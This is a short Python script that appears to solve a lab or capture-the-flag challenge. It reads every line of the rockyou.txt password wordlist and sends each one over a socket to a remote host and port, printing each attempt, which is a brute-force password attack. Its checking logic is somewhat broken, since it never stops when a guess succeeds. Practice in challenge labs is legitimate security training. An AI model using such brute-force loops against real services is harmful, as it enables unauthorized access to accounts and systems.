import socket


ip ='lab.shellterlabs.com'
port = 34242

arq = open('rockyou.txt','r')
linhas = arq.readlines()

for linha in linhas:
        s =socket.socket()
        s.connect((ip, port))
        s.send(linha)
        resposta = s.recv(1024)
        print ("tentando a senha :",linha)
        if resposta != None:
                resposta = s.recv(1024)

print resposta

